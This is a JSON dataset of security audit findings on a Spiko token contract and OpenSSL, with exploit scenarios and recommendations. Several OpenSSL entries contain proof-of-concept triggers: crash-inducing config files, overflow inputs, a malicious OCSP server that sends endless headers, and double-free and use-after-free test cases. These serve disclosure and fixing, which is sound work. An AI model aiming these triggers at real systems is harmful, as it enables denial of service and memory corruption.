        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-spiko-securityreview.pdf",
        "body": "The Redemption contract uses the ERC-1363compliant onTransferReceived callback function for incoming token transfers that use the transferAndCall or transferFromAndCall functions. However, it is possible for a user to manually send tokens using ERC-20's transfer function (or for a third-party contract, using the transferFrom function), which will lock the tokens in the Redemption contract. We are aware that an operator can burn these tokens and mint them back again to the allowlisted user's account, but we are not aware of the consequences of these actions with respect to the EU regulations. Exploit Scenario Alice, a Spiko token holder, wants to redeem her shares. Not knowing of the existence of ERC-1363, she sends the tokens to the Redemption contract using ERC-20s transfer function. Her tokens become locked and cannot be recovered. An administrator must burn the tokens and mint them back into her account. Recommendations Short term, give operators a way to recover tokens stuck in the Redemption contract without having to burn and mint them, or provide administrators or operators with an alternative solution, such as an innite approval from the Redemption contract. Long term, document this behavior and make sure users are aware of the risk.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Event emissions are ignored in the provided test suite ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-spiko-securityreview.pdf",
        "body": "Mutation tests revealed that the provided test suite is not correctly checking for the emission of certain events. In Token.sol , the path that reverts with the custom UnauthorizedFrom reason is not tested thoroughly. When replacing the condition with if(false) or replacing the custom revert with a normal revert, the tests still pass. In Oracle.sol , the emission of the Update event in the publishPrice function is not correctly checked in the tests. In addition, the return value is not checked. In Redemption.sol , several event emissions are not checked:    The RedemptionInitiated event and the burning of token shares in the onTransferReceived function: The burn is checked only via the Transfer event and not via the account balance or total supply of tokens. The RedemptionExecuted event in the executeRedemption function The RedemptionCanceled event and the transfer of token shares in the cancelRedemption function: The transfer is checked only via the Transfer event and not via the account balance.  The EnableOutput event in the registerOutput function Recommendations Short term, x the test suite and ensure that the events are correctly tested. Long term, modify the test suite to consider adversarial cases and help detect malfunctioning tests early. Use linters or other automated analysis tools to detect incorrect statements in the tests. 2. publishPrice can modify an existing price or lock the oracle Severity: Informational Diculty: High Type: Data Validation Finding ID: TOB-SPIKO-2 Target: contracts/oracle/Oracle.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. No minimum amount required for redemption ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-spiko-securityreview.pdf",
        "body": "There is no limit on the minimum amount of tokens that must be transferred for redemption, so users can generate events with zero-value or dust-value transfers. The tokens provided in the test suite that correspond to USD- and EUR-nominated shares (spUSD and spEUR) have nine decimals each. Since the user can decide to redeem shares for at currency or for stablecoins with fewer decimals (such as USDC), it is possible for token dust to be unredeemable, becoming lost in the process and aecting the total supply of tokensand therefore the NAV of the shares. Exploit Scenario Alice, an allowlisted user who has some shares in her account, decides to transfer dust amounts of her shares to be redeemed for at currency, which usually has two decimals. The Spiko team receives numerous RedemptionInitiated events for small values. In an extreme case, she decides to generate a high number of events, via low-amount (or zero-amount) transfers, causing the team an unexpected amount of administrative work to deal with the requests. Recommendations Short term, evaluate and document whether this behavior is expected. If it is not, add a minimum token transfer amount for starting the redemption process. Long term, add the relevant tests for edge cases, where the user triggers unexpected behavior either accidentally or on purpose. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Risk of signed integer overows when parsing property queries ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "The parse_number , parse_hex , and parse_oct functions are used to parse strings to an OSSL_PROPERTY_LIST ; their arithmetic operations could result in signed integer overows, which is undened behavior. static int parse_number( const char *t[], OSSL_PROPERTY_DEFINITION *res) { const char *s = *t; int64_t v = 0 ; if (!ossl_isdigit(*s)) return 0 ; do { v = v * 10 + (*s++ - '0' ); } while (ossl_isdigit(*s)); // ... } Figure 1.1: Passing a string representing a large number to parse_number causes undened behavior. ( crypto/property/property_parse.c ) The following gures show example inputs to these functions that cause undened behavior due to overow. char * input = \"f.a=0x00ffffffffffffffffffffffffffffffffffffffffffffffff0ffffffffffffffffffffffffff fffffffffffff0fffffff\" // crypto/property/property_parse.c:124:11: runtime error: left shift of 6148914691236517205 by 4 places cannot be represented in type 'int64_t' (aka 'long long') Figure 1.2: An overow that results from parsing a large hexadecimal number char * input = \"a.a=401846744073709551615\" // crypto/property/property_parse.c:103:15: runtime error: signed integer overflow: 4018467440737095516 * 10 cannot be represented in type 'long long' Figure 1.3: An overow that results from parsing a large decimal number char * input = \"a.a=0000000000020000000000000000000000000000000\" // crypto/property/property_parse.c:149:16: runtime error: left shift of 2305843009213693952 by 3 places cannot be represented in type 'int64_t' (aka 'long long') Figure 1.4: An overow that results from parsing a large octal number The following code can be used to reproduce the bug. In order to log the same messages shown in the above examples, UndenedBehaviorSanitizer (UBSan) must be enabled ( enable-ubsan in OpenSSL). OSSL_PROPERTY_LIST *list = ossl_parse_property( NULL , input); if (list) { ossl_property_free(list); } Figure 1.5: Code that reproduces the signed long integer overows This nding was discovered by the provider fuzzer described in appendix D . Recommendations Short term, add checks to prevent overows to the arithmetic operations in parse_number , parse_hex , and parse_oct . Long term, review the projects current fuzzing coverage to ensure that all input parsers have sucient coverage.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. The provider conguration format is prone to misuse ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "Users can load and activate providers using the OpenSSL library conguration le. The le format appears to be inspired by the Windows INI conguration le format. The documentation in the provider README le contains the following example, describing how to load and activate the default and legacy providers. openssl_conf = openssl_init [openssl_init] providers = provider_sect [provider_sect] default = default_sect legacy = legacy_sect [default_sect] activate = 1 [legacy_sect] activate = 1 Figure 2.1: An example provider conguration section from the provider README le ( README-PROVIDERS.md ) From the example and the overall le format, end users could easily infer that they could use the syntax activate = 0 to ensure that a particular provider is not used. This would also be consistent with the INI le format, in which values such as 1 , yes , true , and on would typically be interpreted as true, and in which 0 , no , false , and off would be interpreted as false. However, by looking at the provider section parser function provider_conf_load , we see that the value assigned to the activate key is ignored by the parser. for (i = 0 ; i < sk_CONF_VALUE_num(ecmds); i++) { CONF_VALUE *ecmd = sk_CONF_VALUE_value(ecmds, i); const char *confname = skip_dot(ecmd->name); const char *confvalue = ecmd->value; OSSL_TRACE2(CONF, \"Provider command: %s = %s\\n\" , confname, confvalue); /* First handle some special pseudo confs */ /* Override provider name to use */ if (strcmp(confname, \"identity\" ) == 0 ) name = confvalue; else if (strcmp(confname, \"soft_load\" ) == 0 ) soft = 1 ; /* Load a dynamic PROVIDER */ else if (strcmp(confname, \"module\" ) == 0 ) path = confvalue; else if (strcmp(confname, \"activate\" ) == 0 ) activate = 1 ; } if (activate) { ok = provider_conf_activate(libctx, name, value, path, soft, cnf); } else { // ... } Figure 2.2: The value assigned to activate is ignored by the provider_conf_load function. ( crypto/provider_conf.c ) We note that this surprising behavior is described in the man page for the OpenSSL conguration le format , which says the following about the activate key: If present, the module is activated. The value assigned to this name is not signicant. However, users who are not aware of this behavior may end up activating insecure providers by mistake. Exploit Scenario An OpenSSL end user wants to ensure that an application is using only FIPS-compliant algorithms. To ensure that the legacy provider is not active, she includes the following section in her OpenSSL conguration le and thus enables the legacy provider by mistake instead of disabling it as intended. [provider_sect] # ... legacy = legacy_sect [legacy_sect] activate = 0 Figure 2.3: An end user could enable an insecure provider by mistake by setting the value for the corresponding activate key to 0 . Recommendations Short term, have the provider_conf_load function return 0 , signaling a fatal error, if a user attempts to set the activate key to a value dierent from 1 . Long term, extend the parser to take the value assigned to the activate key into account, document the values accepted by the parser along with their interpretations, and have the parser activate the corresponding provider only on truthy values.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. The default provider supports insecure algorithms ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "The default provider includes multiple versions of Triple-DES (based on both the two-key and three-key variants of the algorithm). The DES block size is only 64 bits, and the cipher is vulnerable to (practical) birthday attacks against long-lived sessions . #ifndef OPENSSL_NO_DES ALG(PROV_NAMES_DES_EDE3_ECB, ossl_tdes_ede3_ecb_functions), ALG(PROV_NAMES_DES_EDE3_CBC, ossl_tdes_ede3_cbc_functions), ALG(PROV_NAMES_DES_EDE3_OFB, ossl_tdes_ede3_ofb_functions), ALG(PROV_NAMES_DES_EDE3_CFB, ossl_tdes_ede3_cfb_functions), ALG(PROV_NAMES_DES_EDE3_CFB8, ossl_tdes_ede3_cfb8_functions), ALG(PROV_NAMES_DES_EDE3_CFB1, ossl_tdes_ede3_cfb1_functions), ALG(PROV_NAMES_DES3_WRAP, ossl_tdes_wrap_cbc_functions), ALG(PROV_NAMES_DES_EDE_ECB, ossl_tdes_ede2_ecb_functions), ALG(PROV_NAMES_DES_EDE_CBC, ossl_tdes_ede2_cbc_functions), ALG(PROV_NAMES_DES_EDE_OFB, ossl_tdes_ede2_ofb_functions), ALG(PROV_NAMES_DES_EDE_CFB, ossl_tdes_ede2_cfb_functions), #endif /* OPENSSL_NO_DES */ Figure 3.1: The default provider supports a number of Triple-DES based algorithms. ( providers/defltprov.c ) NIST SP 800-131A revision 2 disallows the use of the two-key variant of Triple-DES for encryption and has deprecated use of the three-key variant. Algorithm Two-key TDEA Encryption Two-key TDEA Decryption Three-key TDEA Encryption Status Disallowed Legacy use Deprecated through 2023 Disallowed after 2023 Three-key TDEA Decryption Legacy use Figure 3.2: Table 1 in NIST SP 800-131A revision 2 details the current status of two-key and three-key Triple-DES (TDEA). Exploit Scenario An application that supports cipher negotiation relies on OpenSSL for cryptographic operations. Because the default provider is loaded, the application supports legacy algorithms like the two-key variant of Triple-DES, making it vulnerable to birthday attacks like Sweet32 . Recommendations Short term, publish a deprecation schedule for Triple-DES-based algorithms. Long term, move all Triple-DES-based algorithms to the legacy provider in the next major release of OpenSSL.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "4. Provider conguration section can cause a stack overow ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "Parsing a conguration containing a self-referencing string value causes the provider_conf_params function to call itself recursively and overow the stack. For example, loading the following conguration le, which references the provider_sect section within the same section, causes OpenSSL to crash with a stack overow. openssl_conf = openssl_init [openssl_init] providers = provider_sect [provider_sect] = provider_sect Figure 4.1: A conguration le that causes a stack overow The following code snippet shows the vulnerable code. If the value references the section in which the corresponding key-value pair is dened, the function will call itself recursively. The recursion depth is limited by the name buer size of 512 bytes. However, if name is empty, then up to 512 recursive calls are possible. This is because each recursive call will append only a single period character [ . ] to the name buer if name is empty. Experiments show that the stack size limit is hit quickly. static int provider_conf_params (OSSL_PROVIDER *prov, OSSL_PROVIDER_INFO *provinfo, const char *name , const char *value, const CONF *cnf) { STACK_OF(CONF_VALUE) *sect; int ok = 1 ; sect = NCONF_get_section(cnf, value); if (sect != NULL ) { int i; char buffer[ 512 ]; size_t buffer_len = 0 ; OSSL_TRACE1(CONF, \"Provider params: start section %s\\n\" , value); if (name != NULL ) { OPENSSL_strlcpy(buffer, name, sizeof (buffer)); OPENSSL_strlcat(buffer, \".\" , sizeof (buffer)); buffer_len = strlen(buffer); } for (i = 0 ; i < sk_CONF_VALUE_num(sect); i++) { CONF_VALUE *sectconf = sk_CONF_VALUE_value(sect, i); if (buffer_len + strlen(sectconf->name) >= sizeof (buffer)) return 0 ; buffer[buffer_len] = '\\0' ; OPENSSL_strlcat(buffer, sectconf->name, sizeof (buffer)); if (! provider_conf_params(prov, provinfo, buffer, sectconf->value, cnf) ) return 0 ; } OSSL_TRACE1(CONF, \"Provider params: finish section %s\\n\" , value); } else { // ... } return ok; } Figure 4.2: The provider_conf_params function can cause a stack overow. ( crypto/provider_conf.c#67111 ) Recommendations Short term, have the provider_conf_params function count the number of recursive calls that will result depending on the conguration le; impose a hard limit (e.g., 10) on the number of recursive calls allowed. Alternatively, rewrite this function to store the allocations on the heap instead of the stack and iteratively go over the conguration. Long term, use clang-tidy to detect recursive calls and verify that a recursion base case prevents the stack from overowing. Also, improve the projects fuzzing coverage by fuzzing not only the conguration parsing code but also the conguration module initialization code. 5. Risk of heap bu\u0000er overow during parsing of OIDs Severity: Informational Diculty: High Type: Undened Behavior Finding ID: TOB-OSSL-5 Target: crypto/asn1/asn_moid.c",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Risk of segmentation fault when loading property list in stable conguration section ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "Parsing a conguration containing a malicious property string in a stable section can cause a segmentation fault. The following conguration le contains the property string min . Loading this conguration will cause a null pointer dereference because the value of the property named min is null. openssl_conf = openssl_init [openssl_init] s = mstbl [mstbl] id-tc26 = min Figure 6.1: An example conguration that causes a segmentation fault The null pointer dereference happens in the do_tcreate function. When parsing the property list, the value is assumed to be non-null. Passing a null value to strtoul is undened behavior. On macOS, this causes OpenSSL to crash with a segmentation fault. lst = X509V3_parse_list(value); if (!lst) goto err; for (i = 0 ; i < sk_CONF_VALUE_num(lst); i++) { cnf = sk_CONF_VALUE_value(lst, i); if (strcmp(cnf->name, \"min\" ) == 0 ) { tbl_min = strtoul( cnf->value , &eptr, 0 ); if (*eptr) goto err; } else if (strcmp(cnf->name, \"max\" ) == 0 ) { tbl_max = strtoul( cnf->value , &eptr, 0 ); if (*eptr) goto err; } else if (strcmp(cnf->name, \"mask\" ) == 0 ) { if (!ASN1_str2mask( cnf->value , &tbl_mask) || !tbl_mask) goto err; } else if (strcmp(cnf->name, \"flags\" ) == 0 ) { if (strcmp( cnf->value , \"nomask\" ) == 0 ) tbl_flags = STABLE_NO_MASK; else if (strcmp(cnf->value, \"none\" ) == 0 ) tbl_flags = STABLE_FLAGS_CLEAR; else goto err; } else goto err; } Figure 6.2: The implementation of do_tcreate fails to check whether cnf->value is null. ( crypto/asn1/asn_mstbl.c#7095 ) Recommendations Short term, add a null check before the use of cnf->value . Long term, improve the projects fuzzing coverage by fuzzing not only the conguration parsing code but also the conguration module initialization code.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. The ossl_prov_memdup function does not update dst_len if the call fails ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "The ossl_prov_memdup function is used throughout the provider implementations to securely duplicate a contiguous block of memory. If the copy operation succeeds, the function updates dst_len to the value of src_len . However, if the allocation fails, the function sets dst to NULL but fails to set dst_len to 0 . /* Duplicate a lump of memory safely */ int ossl_prov_memdup ( const void *src, size_t src_len, unsigned char **dest, size_t *dest_len) { if (src != NULL ) { if ((*dest = OPENSSL_memdup(src, src_len)) == NULL ) { ERR_raise(ERR_LIB_PROV, ERR_R_MALLOC_FAILURE); return 0 ; } *dest_len = src_len; } else { *dest = NULL ; *dest_len = 0 ; } return 1 ; } Figure 7.1: If the src argument is NULL , then dst_len is set to 0 , but if the allocation fails, dst_len is not updated. ( providers/common/provider_util.c ) Recommendations Short term, have ossl_prov_memdup set dst_len to 0 if the call to OPENSSL_memdup fails. Long term, ensure that return values are always initialized before returning control to the calling function.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. API misuse may lead to unexpected segmentation fault ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "Several API usage patterns might lead to unexpected segmentation faults. 1. If the encoder API is used without calling the OSSL_ENCODER_CTX_set_cleanup function, a null pointer dereference will occur in the encoder_process function. OSSL_ENCODER_CTX *ctx = NULL ; if ((ctx = OSSL_ENCODER_CTX_new()) == NULL ) { ERR_raise(ERR_LIB_OSSL_ENCODER, ERR_R_MALLOC_FAILURE); return 0 ; } OSSL_ENCODER_CTX_set_construct(ctx, test_construct); OSSL_ENCODER *encoder = OSSL_ENCODER_fetch( NULL , \"RSA\" , \"output=pem,structure=SubjectPublicKeyInfo\" ); OSSL_ENCODER_CTX_add_encoder(ctx, encoder); // Not including this call leads to a SEGV. // OSSL_ENCODER_CTX_set_cleanup(ctx, cleanup); OSSL_ENCODER_to_bio(ctx, mem); Figure 8.1: An example of an invalid use of OSSL_ENCODER_CTX 2. The following dispatch array denition passes the initialization checks but causes null pointer dereferences when used later on. This provider is missing a NEWCTX and FREE function. However, during the initialization checks (gure 8.3), only the number of OSSL_FUNC_KDF_NEWCTX entries is checked, regardless of whether they are null. const OSSL_DISPATCH ossl_kdf_hkdf_functions[] = { { OSSL_FUNC_KDF_NEWCTX, NULL }, { OSSL_FUNC_KDF_NEWCTX, NULL }, { OSSL_FUNC_KDF_DUPCTX, ( void (*)( void ))kdf_hkdf_dup }, { OSSL_FUNC_KDF_RESET, ( void (*)( void ))kdf_hkdf_reset }, { OSSL_FUNC_KDF_DERIVE, ( void (*)( void ))kdf_hkdf_derive }, { OSSL_FUNC_KDF_SETTABLE_CTX_PARAMS, ( void (*)( void ))kdf_hkdf_settable_ctx_params }, { OSSL_FUNC_KDF_SET_CTX_PARAMS, ( void (*)( void ))kdf_hkdf_set_ctx_params }, { OSSL_FUNC_KDF_GETTABLE_CTX_PARAMS, ( void (*)( void ))kdf_hkdf_gettable_ctx_params }, { OSSL_FUNC_KDF_GET_CTX_PARAMS, ( void (*)( void ))kdf_hkdf_get_ctx_params }, { 0 , NULL } }; Figure 8.2: An invalid provider denition for (; fns->function_id != 0 ; fns++) { switch (fns->function_id) { case OSSL_FUNC_KDF_NEWCTX : if (kdf->newctx != NULL ) break ; kdf->newctx = OSSL_FUNC_kdf_newctx(fns); fnctxcnt++; break ; // ... } // ... if (fnkdfcnt != 1 || fnctxcnt != 2 ) { /* * In order to be a consistent set of functions we must have at least * a derive function, and a complete set of context management * functions. */ evp_kdf_free(kdf); ERR_raise(ERR_LIB_EVP, EVP_R_INVALID_PROVIDER_FUNCTIONS); return NULL ; } Figure 8.3: Initialization checks ( openssl/crypto/evp/kdf_meth.c#7885 ) EVP_KDF *kdf = EVP_KDF_fetch( NULL , \"HKDF\" , NULL ); EVP_KDF_CTX *kctx = EVP_KDF_CTX_new(kdf); EVP_KDF_CTX_free(kctx); Figure 8.4: Example code that causes a null pointer dereference when used with the above dispatch array This nding is related to this GitHub issue , which discusses the lack of the EVP_CIPHER_CTX_copy function. Recommendations Short term, add null checks to the relevant implementation. For the rst issue, the code should check whether a cleanup function is dened. For the second issue, add null checks for the functions in the dispatch array. Long term, develop more precise guidelines on the parameters and functions for which users are responsible for adding null checks. 9. Insu\u0000cient validation in dh_gen_common_set_params Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-OSSL-9 Target: providers/implementations/keymgmt/dh_kmgmt.c",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. HTTP client redirects to local host instead of remote one ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "The HTTP client redirects to a local host even if the redirection response contains a URL with a remote host. A server responding with the following HTTP response redirects a client to the same server instead of a dierent one. HTTP/1.1 302 Everything Is Just Fine Server: netcat Location: //openssl.org Figure 10.1: HTTP server response This is due to an invalid assumption about URLs. The HTTP client assumes that URLs starting with a slash [ / ] generally refer to a host-relative resource location. However, URLs can start with a double slash to indicate that a resource is located on a dierent host but is accessible over the same protocol (i.e., HTTP/HTTPS). The bug exists in the following code, where the redirection URL is compared with a slash. if (resp == NULL && redirection_url != NULL ) { if (redirection_ok(++n_redirs, current_url, redirection_url) && may_still_retry(max_time, &timeout)) { ( void )BIO_reset(bio); OPENSSL_free(current_url); current_url = redirection_url; if (*redirection_url == '/' ) { /* redirection to same server */ // ... goto new_rpath; } // ... ( void )OSSL_HTTP_close(rctx, 1 ); // ... continue ; } // ... } Figure 10.2: The invalid assumption about URLs when interpreting redirection URLs ( openssl/crypto/http/http_client.c#11831210 ) A similar comparison is done in the redirection_ok function. Even though the check in that function does not conform to the URL specication, it does not constitute a bug. The issue can be reproduced by launching a server using the command while true; do cat $HTTP_RESPONSE | nc -l 8000; done , where $HTTP_RESPONSE points to a le containing the contents of gure 10.1. Note that this issue could allow an attacker to circumvent a web application rewall (WAF) protecting an application. Consider using a WAF that disallows requests to local hosts because they could be used to launch SSRF attacks against server A. Now if server A makes a request to server B using the OpenSSL client, which is redirected to //openssl.org , the OpenSSL client will attempt to load a local resource on server A. However, the WAF would not recognize this as a request to a local host and would allow it. This opens up server A to SSRF attacks from malicious third-party servers. Recommendations Short term, modify the code to check whether the URL starts with a double slash and to not redirect to the new_rpath goto if so. Long term, replace the URL parser with a tested implementation. Also, avoid implementing checks on plain URL strings. Instead, provide the functionality in http_lib.c , which can be tested.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. OCSP requests might hang if the server responds with innite headers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "An OCSP request sent by the OpenSSL library might cause a hang in the HTTP client. This is because the HTTP client accepts an unbounded number of HTTP headers. The behavior can be reproduced by creating an HTTP server that sends headers in a loop. The following gure (which is an excerpt from gure F.1 in appendix F ) shows how to create a malicious server that never stops sending HTTP headers. char validreq[] = \"HTTP/1.1 200 OK\\x0D\\x0A\" \"Content-Type: application/ocsp-response\\x0D\\x0A\" ; void send_payload ( int fd) { send(fd, validreq, sizeof (validreq) - 1 , MSG_MORE); while ( 1 ) { send(fd, \"a:b\\x0d\\x0a\" , 5 , MSG_MORE); } } // driver code from figure F.1 Figure 11.1: This is a malicious HTTP server that sends an innite stream of HTTP headers. The driver code from appendix F is required to execute this. When the following OpenSSL OCSP command is invoked against a malicious OCSP server, the program will hang indenitely: openssl ocsp -issuer cert1.pem -cert cert.pem -url http://localhost:8080 . This is due to the following code in http_client.c , which loops indenitely: /* Attempt to read a line in */ next_line : // ... n = BIO_get_mem_data(rctx->mem, &p); // ... n = BIO_gets(rctx->mem, buf, rctx->buf_size); // ... key = buf; value = strchr(key, ':' ); if (value != NULL ) { // ... } if (value != NULL && line_end != NULL ) { if (rctx->state == OHS_REDIRECT && OPENSSL_strcasecmp(key, \"Location\" ) == 0 ) { // ... } if (OPENSSL_strcasecmp(key, \"Content-Type\" ) == 0 ) { // ... } // ... } /* Look for blank line indicating end of headers */ for (p = rctx->buf; *p != '\\0' ; p++) { if (*p != '\\r' && *p != '\\n' ) break ; } if (*p != '\\0' ) /* not end of headers */ goto next_line; Figure 11.2: The code responsible for parsing headers, which can loop indenitely ( openssl/crypto/http/http_client.c#639756 ) This nding is inspired by CVE-2023-38039 . Exploit Scenario A server application is checking the validity of certicates using OpenSSL. A malicious OCSP server causes the server application to hang by sending an innite stream of headers. Recommendations Short term, limit the number of headers received to a reasonable number (e.g., 30). This is already done for the length of HTTP lines using OSSL_HTTP_DEFAULT_MAX_LINE_LEN . Long term, consider switching to a more battle-hardened HTTP client library. The third-party library could be an optional dependency and the current implementation could be used as fallback. The PicoHTTPParser (MIT/Perl licensed) by the h2o project could be a candidate for such a library.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Calling EVP_KDF_CTX_reset causes a double free when the context is freed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "A KDF context allows the current state to be reset using the EVP_KDF_CTX_reset function. After a reset, the Scrypt implementation will cause a double free either when it is reset again or when it is eventually freed. Since pointer elds in the context are not explicitly set to null after the corresponding data is freed, the next reset will cause the OPENSSL_free function to be called on already freed data. This behavior is implemented in the kdf_scrypt_reset function, which frees data but does not set the pointers to null, like the kdf_hkdf_reset function does, for example. static void kdf_scrypt_reset ( void *vctx) { KDF_SCRYPT *ctx = (KDF_SCRYPT *)vctx; OPENSSL_free(ctx->salt); OPENSSL_clear_free(ctx->pass, ctx->pass_len); kdf_scrypt_init(ctx); } Figure 12.1: The function that frees the current salt and pass eld but does not set them to null ( openssl/providers/implementations/kdfs/scrypt.c#9299 ) The code is reachable through the following test case. EVP_KDF *kdf; EVP_KDF_CTX *kctx = NULL ; OSSL_PARAM params[ 6 ], *p = params; if ((kdf = EVP_KDF_fetch( NULL , \"scrypt\" , NULL )) == NULL ) { goto end; } kctx = EVP_KDF_CTX_new(kdf); EVP_KDF_free(kdf); if (kctx == NULL ) { goto end; } *p++ = OSSL_PARAM_construct_utf8_string( \"digest\" , \"sha256\" , ( size_t ) 7 ); *p++ = OSSL_PARAM_construct_octet_string( \"salt\" , \"salt\" , ( size_t ) 4 ); *p++ = OSSL_PARAM_construct_octet_string( \"key\" , \"secret\" , ( size_t ) 6 ); *p++ = OSSL_PARAM_construct_octet_string( \"info\" , \"label\" , ( size_t ) 5 ); *p = OSSL_PARAM_construct_end(); if (EVP_KDF_CTX_set_params(kctx, params) <= 0 ) { goto end; } EVP_KDF_CTX_reset(kctx); // calling reset here again also causes a double free: EVP_KDF_CTX_reset(kctx); end : EVP_KDF_CTX_free(kctx); return 1 ; Figure 12.2: A test case that resets and clears the KDF context Exploit Scenario A user of OpenSSL implements a function that conditionally resets the Scrypt KDF before freeing it. During testing, the double free is not triggered because the branch that executes EVP_KDF_CTX_reset is not tested. In the production system, this branch is reachable through a specic input. An attacker could use this behavior to either crash the system or cause undened behavior. Recommendations Short term, have the code set the salt , pass , and pass_len elds to 0 . Alternatively, have the code clear out the memory of the whole context if this is desired (i.e., memset(ctx, 0, sizeof(*ctx)) ). Long term, add tests that call all operation functions for each provider implementation. Also, deploy the fuzzer for the providers, which is provided in appendix D .",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. The aesni_cbc_hmac_sha256_cipher function depends on compiler-specic behavior ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "The implementation of the aesni_cbc_hmac_sha256_cipher function uses signed integer right-shifts when verifying the HMAC. The type of shift used is implementation-dependent according to the C99 standard, which means that the behavior of the function may vary between compilers. for (res = 0 , i = 0 , j = 0 ; j < maxpad + SHA256_DIGEST_LENGTH; j++) { c = p[j]; cmask = (( int )(j - off - SHA256_DIGEST_LENGTH)) >> ( sizeof ( int ) * 8 - 1 ); res |= (c ^ pad) & ~cmask; /* ... and padding */ cmask &= (( int )(off - 1 - j)) >> ( sizeof ( int ) * 8 - 1 ); res |= (c ^ pmac->c[i]) & cmask; i += 1 & cmask; } Figure 13.1: HMAC verication in aesni_cbc_hmac_sha256_cipher depends on compiler-specic behavior. ( crypto/evp/e_aes_cbc_hmac_sha256.c ) Signed integer right-shifts may be implemented as either arithmetic or logical right-shifts according to section 6.5.7 of the C99 standard : If E1 has a signed type and a negative value, the resulting value is implementation-dened. This means that if the shifted value E1 is negative, E1 >> (sizeof(int) * 8 - 1) may be either 1 or -1 , depending on the compiler. It follows that the behavior of the code above may also be compiler-dependent. The same issue is also present in the implementations of the following functions:  aesni_cbc_hmac_sha1_cipher (in e_aes_cbc_hmac_sha1.c )  aesni_cbc_hmac_sha1_cipher (in cipher_aes_cbc_hmac_sha1_hw.c )  aesni_cbc_hmac_sha256_cipher (in cipher_aes_cbc_hmac_sha256_hw.c ) Exploit Scenario A developer builds OpenSSL with a C99-compliant compiler that uses a logical right-shift for signed integer right-shifts. This causes the library to fail to validate TLS-record HMACs. Recommendations Short term, rewrite the HMAC verication in all of the implementations of aesni_cbc_hmac_sha256_cipher and aesni_cbc_hmac_sha1_cipher to not use signed integer right-shifts. Long term, regularly run static analysis tools that detect undened and implementation-specic behavior like Cppcheck.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Use after free when setting invalid properties on the Scrypt algorithm or if SHA-256 is missing ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-openssl-securityreview.pdf",
        "body": "The Scrypt KDF implementation frees the EVP_KDF_CTX data if it fails to fetch the SHA-256 algorithm. This can happen either if an invalid properties string is set through the OSSL_PARAM array ( OSSL_KDF_PARAM_PROPERTIES ) or if SHA-256 is not available through the currently loaded providers. After the unexpected free, a use-after-free bug can occur. Figure 14.1 shows a test case that will trigger the use-after-free bug. int r = 1 ; EVP_KDF *kdf; EVP_KDF_CTX *kctx = NULL ; unsigned char derived[ 32 ]; OSSL_PARAM params[ 9 ], *p = params; uint64_t s_N = 2 ; uint64_t s_r = 8 ; uint64_t s_P = 1 ; if ((kdf = EVP_KDF_fetch( NULL , \"scrypt\" , NULL )) == NULL ) { goto end; } kctx = EVP_KDF_CTX_new(kdf); EVP_KDF_free(kdf); if (kctx == NULL ) { goto end; } /* Build up the parameters for the derivation */ *p++ = OSSL_PARAM_construct_octet_string( \"secret\" , \"secret\" , ( size_t ) 6 ); *p++ = OSSL_PARAM_construct_octet_string( \"pass\" , \"pass\" , ( size_t ) 4 ); *p++ = OSSL_PARAM_construct_octet_string( \"salt\" , \"salt\" , ( size_t ) 4 ); *p++ = OSSL_PARAM_construct_uint64( \"n\" , &s_N); *p++ = OSSL_PARAM_construct_uint64( \"r\" , &s_r); *p++ = OSSL_PARAM_construct_uint64( \"p\" , &s_P); // The following line causes a use-after-free later on. *p++ = OSSL_PARAM_construct_utf8_string( \"properties\" , \"invalid\" , ( size_t ) 